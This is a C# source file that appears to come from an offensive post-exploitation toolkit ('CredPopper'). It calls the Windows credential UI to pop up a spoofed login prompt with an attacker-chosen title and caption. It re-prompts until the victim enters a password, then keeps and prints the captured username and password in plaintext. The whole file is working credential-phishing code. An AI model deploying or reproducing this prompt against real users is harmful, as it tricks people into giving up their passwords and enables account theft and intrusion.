using System;
using System.Runtime.InteropServices;
using System.Text;
using Core.WindowsInternals;

namespace Core.CredPopper
{
    public static class CredentialsPrompt
    {
        public static string title;
        public static string caption;
        private static string _creds;
        public static string usernameField;

        private const int MAX_USER_NAME = 100;
        private const int MAX_PASSWORD = 100;

        public static void GetCreds()
        {
            Console.WriteLine(_creds);
        }

        public static void CredPopper()
        {
            const int minLengthPassword = 2;
            var username = usernameField;

            var info = new Internals.CreduiInfo {pszCaptionText = title, pszMessageText =  caption};

            const Internals.CredUIFlags flags = Internals.CredUIFlags.GenericCredentials | Internals.CredUIFlags.ShowSaveCheckBox | Internals.CredUIFlags.AlwaysShowUi |
                                                Internals.CredUIFlags.ExpectConfirmation | Internals.CredUIFlags.Persist;

            var savePwd = false;

            PromptForCredentials(ref info, title, 0, username, out var password, ref savePwd, flags, minLengthPassword);
            _creds = "[+] Username: " + username + "\r\n[+] Password: " + password;
        }

        private static void PromptForCredentials(ref Internals.CreduiInfo creditUi, string targetName, int netError, string userName, out string password, ref bool save,
            Internals.CredUIFlags flags, int minLengthPassword)
        {
            var usernameNew = new StringBuilder(MAX_PASSWORD);
            usernameNew.Append(userName);
            var pwd = new StringBuilder(MAX_PASSWORD);
            creditUi.cbSize = Marshal.SizeOf(creditUi);

            Internals.CredUIPromptForCredentialsW(ref creditUi, targetName, IntPtr.Zero, netError, usernameNew, MAX_USER_NAME, pwd, MAX_PASSWORD, ref save, flags);

            password = pwd.ToString();

            while (pwd.ToString().Length < minLengthPassword)
            {
                Internals.CredUIPromptForCredentialsW(ref creditUi, targetName, IntPtr.Zero, netError, usernameNew, MAX_USER_NAME, pwd, MAX_PASSWORD, ref save, flags);
            }

            password = pwd.ToString();
        }
    }
}